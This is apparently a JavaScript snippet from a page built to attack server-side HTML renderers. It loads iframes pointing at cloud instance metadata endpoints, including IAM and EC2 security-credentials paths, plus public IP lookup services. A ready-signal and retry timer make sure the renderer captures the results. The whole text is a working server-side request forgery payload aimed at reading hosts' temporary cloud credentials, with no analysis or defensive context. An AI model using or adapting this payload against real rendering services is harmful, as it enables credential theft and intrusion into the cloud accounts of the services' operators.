
            urls = [
                ["https://api.ipify.org/",40],
                ["https://api.myip.com",40],
                ["http://169.254.169.254/latest/meta-data/hostname",40],
                ["http://169.254.169.254/latest/meta-data",400],
                ["http://169.254.169.254/latest/meta-data/iam/info",400],
                ["http://169.254.169.254/latest/meta-data/security-groups",40],
                ["http://169.254.169.254/latest/meta-data/profile",40],
                ["http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info",150],
                ["http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",400]
            ];
            window.loaded_iframes = 0;
            
            window.log_fn = function(text){
                document.getElementById("log").innerText += ((new Date()).toJSON() + " : " + text + "\n");
            }
            
            function mark_complete(){
                log_fn("Marking complete")
                window.status = 'READY';
                document.body.classList.add('page-loaded');
            }
            
            function iframe_loaded(){
                window.loaded_iframes += 1;
                log_fn("Iframes loaded = " + window.loaded_iframes + "/" + urls.length);
                if (window.loaded_iframes == urls.length)
                {
                    log_fn("All iframes loaded");
                    mark_complete();
                }
            }
            
            log_fn("Starting");
            
            for (i = 0; i < urls.length; i++) {
                header = document.createElement('h3');
                header.innerText = urls[i][0];
                document.body.appendChild(header);  
                
                mi = document.createElement('iframe');
                mi.width = 600;
                mi.height = urls[i][1];
                mi.onload = iframe_loaded;
            
                mi.src = urls[i][0];
                document.body.appendChild(mi);  
                
                document.body.appendChild(document.createElement('hr'));
            }
            
            window.tries_left = 10;
            
            
            
            (function check_fn(){
                window.tries_left = window.tries_left - 1;
                log_fn("Time left " + tries_left);
                if (window.tries_left > 0 && window.status != 'READY')
                {
                    setTimeout(check_fn, 1000)
                }
                else
                {
                    mark_complete();
                }
            })();
       
